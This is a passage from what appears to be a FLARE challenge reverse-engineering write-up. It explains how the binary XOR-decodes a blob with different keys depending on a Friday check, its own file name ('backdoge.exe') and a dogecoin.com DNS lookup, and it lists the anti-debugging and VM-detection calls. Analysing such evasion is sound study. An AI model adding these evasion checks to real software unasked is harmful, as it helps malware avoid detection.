&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-13.jpg&#34; alt=&#34;Checking day of the week&#34; title=&#34;Checking day of the week&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This is not a countermeasure but a simple check. First &lt;code&gt;time64&lt;/code&gt; is called and returns the number of seconds since January 1st 1970. Then &lt;code&gt;localtime64&lt;/code&gt; converts it to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/bf12f0hc.aspx&#34; target=&#34;_blank&#34;&gt;readabled format&lt;/a&gt; stored in a structure of type &lt;code&gt;tm&lt;/code&gt; according to MSDN:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;tm&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;// each field is an int (4 bytes)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_sec:&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;Seconds&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;after&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;minute&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_min:&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;Minutes&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;after&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hour&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_hour:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Hours&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;after&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;midnight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_mday:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Day&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;month&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_mon:&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;Month&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;January&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_year:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Year&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(current&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;minus&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1900&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_wday:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Day&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;week&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Sunday&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;offset:&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_yday:&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;Day&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;–&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;365&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;January&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;tm_isdst:&lt;/span&gt;   &lt;span style=&#34;color: #93A1A1&#34;&gt;Positive&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;daylight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;saving&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;effect;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;daylight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;saving&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;effect;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;negative&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;status&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;daylight&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;saving&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unknown&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Next instruction &lt;code&gt;cmp dword ptr [eax+18h], 5&lt;/code&gt; compares 24th (0x16) byte of the structure with 5. Because each field is of type &lt;code&gt;int&lt;/code&gt; and 4 bytes, 24th byte will be the current day of the week. Sunday is 0, so Friday is 5. The application simply checks if it is Friday. If so, it will xor &lt;code&gt;! 50 1337&lt;/code&gt; with the blob and if it is not Friday blob will be xor-ed with &lt;code&gt;1337&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Day of the week check&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(Friday):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;! 50 1337&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;1337&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-9-backdoge-exe:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 9 - Backdoge.exe&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;Electric_Boogaloo&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;OutputDebugString&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;ICanHaz?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;NtGlobalFlag&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;SandsOfTime&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; eax = executable&amp;#39;s name&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Before next function, executable&amp;rsquo;s complete path is saved into &lt;code&gt;eax&lt;/code&gt;. Then &lt;code&gt;sub_4014F0&lt;/code&gt; is called.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-14.jpg&#34; alt=&#34;Comparing executable&#39;s name with backdoge.exe&#34; title=&#34;Comparing executable&#39;s name with backdoge.exe&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Again, this is just a check. Executable&amp;rsquo;s name is compared with &lt;code&gt;backdoge.exe&lt;/code&gt; two characters in each iteration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-15.jpg&#34; alt=&#34;Filename check&#34; title=&#34;Filename check&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The rest is pretty easy. If filename check passes, &lt;code&gt;MATH IS HARD&lt;/code&gt; will be xor-ed with the blob and if not &lt;code&gt;LETS GO SHOPPING&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Filename check&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(filename&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;BackDoge.exe&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;MATH IS HARD&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;LETS GO SHOPPING&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-10-dogecoin-com-ip-check:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 10 - Dogecoin.com IP Check&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;Electric_Boogaloo&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;OutputDebugString&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;ICanHaz?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;NtGlobalFlag&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;SandsOfTime&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BackDoge&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Another check. This time the application retrieves the IP for &lt;code&gt;www.dogecoin.com&lt;/code&gt; using &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;gethostbyname&lt;/a&gt;. The result is of the form &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms738552%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;hostent&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;hostent structure (for Win32)&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
